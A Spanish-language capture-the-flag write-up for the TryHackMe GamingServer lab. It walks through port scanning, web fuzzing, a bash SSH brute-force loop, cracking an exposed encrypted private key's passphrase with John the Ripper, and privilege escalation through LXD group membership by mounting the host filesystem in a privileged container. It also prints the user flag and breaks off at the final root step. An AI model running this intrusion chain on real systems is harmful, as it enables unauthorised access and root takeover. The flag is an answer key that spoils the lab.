## TryHackMe  <> GamingServer

![image](https://github.com/Esevka/CTF/assets/139042999/498c4185-0e3c-4f9b-b116-6dc643d2e93e)

Enlace Maquina: https://tryhackme.com/room/gamingserver

Enunciado : Obtener  flags de usuario y root.
---
---

## Escaneo de puertos

-Lanzamos una traza ICMP(ping) para ver si la maquina esta activa, segun el ttl obtenido por proximidad al valor 64 podriamos decir que es una maquina Linux.

    ┌──(root㉿kali)-[/home/kali]
    └─# ping -c1 10.10.236.80
    PING 10.10.236.80 (10.10.236.80) 56(84) bytes of data.
    64 bytes from 10.10.236.80: icmp_seq=1 ttl=63 time=214 ms
    
    --- 10.10.236.80 ping statistics ---
    1 packets transmitted, 1 received, 0% packet loss, time 0ms
    rtt min/avg/max/mdev = 214.202/214.202/214.202/0.000 ms
    
-Reporte Nmap (Obtenemos puertos abiertos servicios y versiones que estan corriendo).

    ┌──(root㉿kali)-[/home/…/Desktop/ctf/gamingserver/nmap]
    └─# nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.10.236.80 -oN open_ports
    Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-15 17:10 CEST
    PORT   STATE SERVICE REASON
    22/tcp open  ssh     syn-ack ttl 63
    80/tcp open  http    syn-ack ttl 63
                                                                                                                                                                                  
    ┌──(root㉿kali)-[/home/…/Desktop/ctf/gamingserver/nmap]
    └─# nmap -p 22,80 -sCV 10.10.236.80 -vvv -oN info_ports                        
    Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-15 17:11 CEST
    
    PORT   STATE SERVICE REASON         VERSION
    22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 340efe0612673ea4ebab7ac4816dfea9 (RSA)
    | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCrmafoLXloHrZgpBrYym3Lpsxyn7RI2PmwRwBsj1OqlqiGiD4wE11NQy3KE3Pllc/C0WgLBCAAe+qHh3VqfR7d8uv1MbWx1mvmVxK8l29UH1rNT4mFPI3Xa0xqTZn4Iu5RwXXuM4H9OzDglZas6RIm6Gv+sbD2zPdtvo9zDNj0BJClxxB/SugJFMJ+nYfYHXjQFq+p1xayfo3YIW8tUIXpcEQ2kp74buDmYcsxZBarAXDHNhsEHqVry9I854UWXXCdbHveoJqLV02BVOqN3VOw5e1OMTqRQuUvM5V4iKQIUptFCObpthUqv9HeC/l2EZzJENh+PmaRu14izwhK0mxL
    |   256 49611ef4526e7b2998db302d16edf48b (ECDSA)
    | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEaXrFDvKLfEOlKLu6Y8XLGdBuZ2h/sbRwrHtzsyudARPC9et/zwmVaAR9F/QATWM4oIDxpaLhA7yyh8S8m0UOg=
    |   256 b860c45bb7b2d023a0c756595c631ec4 (ED25519)
    |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOLrnjg+MVLy+IxVoSmOkAtdmtSWG0JzsWVDV2XvNwrY
    
    80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
    | http-methods: 
    |_  Supported Methods: GET POST OPTIONS HEAD
    |_http-server-header: Apache/2.4.29 (Ubuntu)
    |_http-title: House of danak
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

## Analisis de vulnerabilidades en los servicios y explotacion de los mismos.

-Revisamos la web en busqueda de info que nos pueda servir.

  - En el codigo de la web encontramos un posible usuario ---> john
    
        john, please add some actual content to the site! lorem ipsum is horrible to look at.
      

  - Si entramos en el apartado "DRAAGAN LORE" encontramos un boton "Uploads" que nos lista el contenido del directorio.
  
      ![image](https://github.com/Esevka/CTF/assets/139042999/4f6fafd0-f46a-49b4-af5f-bb64f865c9b8)

    Nos descargamos dict.lst, segun hemos visto puede ser un diccionario de posibles claves para el usuario anteriormente encontrado john.

  - Podriamos hacer un pequeno script en bash que intente conectar por el servicio ssh del puerto 22 probando esas claves.

      Creamos el script y le damos permisos de ejecucion

        ┌──(root㉿kali)-[/home/…/Desktop/ctf/gamingserver/script]
        └─# touch brute_ssh.sh
                                                                                                                                                                                      
        ┌──(root㉿kali)-[/home/…/Desktop/ctf/gamingserver/script]
        └─# chmod +x brute_ssh.sh
    
  - Contenido del script y su ejecucion, no pudimos loguearnos por ssh.
  
        #!/bin/bash
        for pass in $(cat ../content/dict.lst)
          do
            echo $pass
            sshpass -p $'("pass")' ssh john@10.10.236.80  -o StrictHostKeyChecking=no
          done
  
        ┌──(root㉿kali)-[/home/…/Desktop/ctf/gamingserver/script]
        └─# ./brute_ssh.sh
        Spring2017
        Warning: Permanently added '10.10.236.80' (ED25519) to the list of known hosts.
        Permission denied, please try again.
        Spring2016
        Permission denied, please try again.
        Spring2015
        Permission denied, please try again.
    
-Fuzzeamos la web

    ┌──(root㉿kali)-[/home/kali/Desktop/ctf/gamingserver]
    └─# gobuster dir -u http://10.10.236.80 -w /usr/share/wordlists/dirb/common.txt -o fuzz
    ===============================================================
    Gobuster v3.5
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
    ===============================================================
    /secret               (Status: 301) [Size: 313] [--> http://10.10.236.80/secret/]
    /server-status        (Status: 403) [Size: 277]
    /uploads              (Status: 301) [Size: 314] [--> http://10.10.236.80/uploads/]

  - Encontramos en el directorio /secret un fichero "secretKey" lo que puede ser una clave privada del usuario john para conectarnos por ssh
    
      ![image](https://github.com/Esevka/CTF/assets/139042999/ae93dacb-e0ff-48af-bad9-92975c87fb4f)

      ![image](https://github.com/Esevka/CTF/assets/139042999/7e6f4292-b075-44f1-82c2-1b530e567f83)


  - Nos la copiamos a nuestra maquina y le damos permisos solo de lectura, intentamos conectarnos.
      
        ┌──(root㉿kali)-[/home/kali/Desktop/ctf/gamingserver]
        └─# curl http://10.10.236.80/secret/secretKey -o content/id_rsa
          % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                         Dload  Upload   Total   Spent    Left  Speed
        100  1766  100  1766    0     0  13357      0 --:--:-- --:--:-- --:--:-- 13378                                        
                                                                                                                                                                                      
        ┌──(root㉿kali)-[/home/…/Desktop/ctf/gamingserver/content]
        └─# cat id_rsa        
        -----BEGIN RSA PRIVATE KEY-----
        Proc-Type: 4,ENCRYPTED
        DEK-Info: AES-128-CBC,82823EE792E75948EE2DE731AF1A0547
        
        T7+F+3ilm5FcFZx24mnrugMY455vI461ziMb4NYk9YJV5uwcrx4QflP2Q2Vk8phx
        H4P+PLb79nCc0SrBOPBlB0V3pjLJbf2hKbZazFLtq4FjZq66aLLIr2dRw74MzHSM
        FznFI7jsxYFwPUqZtkz5sTcX1afch+IU5/Id4zTTsCO8qqs6qv5QkMXVGs77F2kS
        Lafx0mJdcuu/5aR3NjNVtluKZyiXInskXiC01+Ynhkqjl4Iy7fEzn2qZnKKPVPv8
        [...]

        ┌──(root㉿kali)-[/home/…/Desktop/ctf/gamingserver/content]
        └─# chmod 400 id_rsa

        ┌──(root㉿kali)-[/home/…/Desktop/ctf/gamingserver/content]
        └─# ssh john@10.10.236.80 -i id_rsa            
        Enter passphrase for key 'id_rsa':

      Nos pide clave para poder utiliar la clave privada que hemos proporcionado, por lo que vamos a intentar crakearla utilizando el diccionario que encontramos anteriormente.

-Crakeamos la id_rsa
    
- Utilizamos ssh2john para generar un fichero que podamos crakear con johntheripper.

        ┌──(root㉿kali)-[/home/…/Desktop/ctf/gamingserver/content]
        └─# ssh2john id_rsa > idrsa_hashjohn
                                                                                                                                                                                          
        ┌──(root㉿kali)-[/home/…/Desktop/ctf/gamingserver/content]
        └─# cat idrsa_hashjohn 
            id_rsa:$sshng$1$16$82823EE792E75948EE2DE731AF1A0547$1200$4fbf85fb78a59b915c159c76e269ebba
            [...]

- Obtencion de la clave 

        ┌──(root㉿kali)-[/home/…/Desktop/ctf/gamingserver/content]
        └─# john --wordlist dict.lst idrsa_john --format=SSH             
        Using default input encoding: UTF-8
        Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
        No password hashes left to crack (see FAQ)
                                                                                                                                                                                      
        ┌──(root㉿kali)-[/home/…/Desktop/ctf/gamingserver/content]
        └─# john idrsa_john --show
        id_rsa:letmein
        
        1 password hash cracked, 0 left

## Conectamos por el servicio SSH
                                                                                                                                                                                  
    ┌──(root㉿kali)-[/home/…/Desktop/ctf/gamingserver/content]
    └─# ssh john@10.10.92.221 -i id_rsa
    The authenticity of host '10.10.92.221 (10.10.92.221)' can't be established.
    ED25519 key fingerprint is SHA256:3Kz4ZAujxMQpTzzS0yLL9dLKLGmA1HJDOLAQWfmcabo.
    This host key is known by the following other names/addresses:
        ~/.ssh/known_hosts:37: [hashed name]
        ~/.ssh/known_hosts:39: [hashed name]
    Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
    Warning: Permanently added '10.10.92.221' (ED25519) to the list of known hosts.
    Enter passphrase for key 'id_rsa': 

    Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-76-generic x86_64)
    
    Last login: Mon Jul 27 20:17:26 2020 from 10.8.5.10
    john@exploitable:~$ 


 ## Postexplotacion elevamos privilegios, Flags

-Obtenemos flag de usuario

    john@exploitable:~$ cd /home/john/
   
    john@exploitable:~$ cat user.txt 
    a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e

-Elevamos privilegios root.

Despues de enumerar las maquina durante un buen rato, encontramos que el usuario john pertence al grupo ---> lxd

- Dos maneras de ver a los grupos que pertenece dicho usuario.
  
        john@exploitable:~$ id
        uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
    
        john@exploitable:~$ cat /etc/group | grep john
        adm:x:4:syslog,john
        cdrom:x:24:john
        sudo:x:27:john
        dip:x:30:john
        plugdev:x:46:john
        lxd:x:108:john
        john:x:1000:

¿Qué es LXD en Ubuntu?
Linux Container Daemon (LXD), es una herramienta de gestión de los contenedores del sistema operativo Linux. Permite crear contenedores de sistemas Linux ideales para su uso en la nube. Con esta herramienta tenemos la posibilidad de crear múltiples contenedores dentro del mismo.

- Explotamos LXD para llegar a root

    Utilizamos el metodo 2.
    INFO: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation

  1)Creamos la imagen para sistema de 32bits, este proceso se realiza en nuesta maquina de atacante.

    - Descargamos la imagen
  
            ┌──(root㉿kali)-[/home/…/Desktop/ctf/gamingserver/lxd]
            └─# git clone https://github.com/saghul/lxd-alpine-builder
            Cloning into 'lxd-alpine-builder'...
            remote: Enumerating objects: 50, done.
            remote: Counting objects: 100% (8/8), done.
            remote: Compressing objects: 100% (6/6), done.
            Receiving objects: 100% (50/50), 3.11 MiB | 2.92 MiB/s, done.
            remote: Total 50 (delta 2), reused 5 (delta 2), pack-reused 42
            Resolving deltas: 100% (15/15), done.
                                                                                                                                                                                          
            ┌──(root㉿kali)-[/home/…/Desktop/ctf/gamingserver/lxd]
            └─# cd lxd-alpine-builder
      
    - Reemplazamos con sed dicho contenido creando un fichero llamado build-alpine
                                                                       
          ┌──(root㉿kali)-[/home/…/ctf/gamingserver/lxd/lxd-alpine-builder]
          └─# sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine                                    
 
    -   Creamos la imagen para sistemas con arquitectura de 32 bits.
                                                                                                                                           
            ┌──(root㉿kali)-[/home/…/ctf/gamingserver/lxd/lxd-alpine-builder]
            └─# ./build-alpine -a i686
            Determining the latest release... v3.8
            [...]
            tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
            alpine-devel@lists.alpinelinux.org-4a6a0840.rsa.pub: OK
            Verified OK
              % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                             Dload  Upload   Total   Spent    Left  Speed
            100  2695  100  2695    0     0   1891      0  0:00:01  0:00:01 --:--:--  1892
            --2023-08-16 09:49:21--  http://alpine.mirror.wearetriple.com/MIRRORS.txt
            Resolving alpine.mirror.wearetriple.com (alpine.mirror.wearetriple.com)... 93.187.10.106, 2a00:1f00:dc06:10::106
            Connecting to alpine.mirror.wearetriple.com (alpine.mirror.wearetriple.com)|93.187.10.106|:80... connected.
            HTTP request sent, awaiting response... 200 OK
            Length: 2695 (2.6K) [text/plain]
            Saving to: ‘/home/kali/Desktop/ctf/gamingserver/lxd/lxd-alpine-builder/rootfs/usr/share/alpine-mirrors/MIRRORS.txt’
            
            /home/kali/Desktop/ctf/gamingserver/lxd/lxd 100%[=========================================================================================>]   2.63K  --.-KB/s    in 0s      
            
            2023-08-16 09:49:21 (308 MB/s) - ‘/home/kali/Desktop/ctf/gamingserver/lxd/lxd-alpine-builder/rootfs/usr/share/alpine-mirrors/MIRRORS.txt’ saved [2695/2695]
            [...]
        
  2)Importamos imagen a la maquina victima y la explotamos

    - Montamos un servidor http mediante python en nuestro equipo y nos descargamos la imagen desde la maquina victima.

            ┌──(root㉿kali)-[/home/…/ctf/gamingserver/lxd/lxd-alpine-builder]
            └─# python3 -m http.server 80
            Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

            john@exploitable:~$ curl http://10.9.92.151/alpine-v3.8-i686-20230816_0949.tar.gz -o /tmp/alpine.tar.gz
              % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                             Dload  Upload   Total   Spent    Left  Speed
            100 2601k  100 2601k    0     0  1624k      0  0:00:01  0:00:01 --:--:-- 1623k
      
            john@exploitable:~$ cd /tmp
      
            john@exploitable:/tmp$ ls -la
            total 2644
            drwxrwxrwt 10 root root    4096 Aug 16 08:17 .
            drwxr-xr-x 24 root root    4096 Feb  5  2020 ..
            -rw-rw-r--  1 john john 2663971 Aug 16 08:17 alpine.tar.gz

    - Importamos la imagen en la maquina victima.

            john@exploitable:/tmp$ lxc image import ./alpine.tar.gz --alias myimage
                Image imported with fingerprint: 4e09783983071fe2ad1eec7150448f116ca2cecb02df307905fd5cd35ea3f6e0

    - Establecemos las configuraciones necesarias basicas para poder correr nuestro contenedor
 
            john@exploitable:/tmp$ lxd init
            Would you like to use LXD clustering? (yes/no) [default=no]: no
            Do you want to configure a new storage pool? (yes/no) [default=yes]: no
            Would you like to connect to a MAAS server? (yes/no) [default=no]: no
            Would you like to create a new local network bridge? (yes/no) [default=yes]: no
            Would you like to configure LXD to use an existing bridge or host interface? (yes/no) [default=no]: no
            Would you like LXD to be available over the network? (yes/no) [default=no]: no
            Would you like stale cached images to be updated automatically? (yes/no) [default=yes] no
            Would you like a YAML "lxd init" preseed to be printed? (yes/no) [default=no]: no
      
    - Corremos el contenedor
      
            john@exploitable:/tmp$ lxc init myimage mycontainer -c security.privileged=true
            Creating mycontainer
      
    INFO: security.privilege=true crea un contenedor privilegiado que establece que el usuario root dentro del contenedor sea el mismo que el usuario root en el sistema host.
  
    
  - Montamos el sistema raiz del host en la carpeta /mnt/root de nuestro contenedor.

        john@exploitable:/tmp$ lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
        Device mydevice added to mycontainer

  -Iniciamos el contenedor

          john@exploitable:/tmp$ lxc list
        +-------------+---------+------+------+------------+-----------+
        |    NAME     |  STATE  | IPV4 | IPV6 |    TYPE    | SNAPSHOTS |
        +-------------+---------+------+------+------------+-----------+
        | mycontainer | STOPPED |      |      | PERSISTENT | 0         |
        +-------------+---------+------+------+------------+-----------+
        john@exploitable:/tmp$ lxc start mycontainer
        john@exploitable:/tmp$ lxc list
        +-------------+---------+-----------------------+-----------------------------------------------+------------+-----------+
        |    NAME     |  STATE  |         IPV4          |                     IPV6                      |    TYPE    | SNAPSHOTS |
        +-------------+---------+-----------------------+-----------------------------------------------+------------+-----------+
        | mycontainer | RUNNING | 10.229.116.117 (eth0) | fd42:2998:1e63:3d6f:216:3eff:fef2:c3c4 (eth0) | PERSISTENT | 0         |

  -Obtener Root

  

        

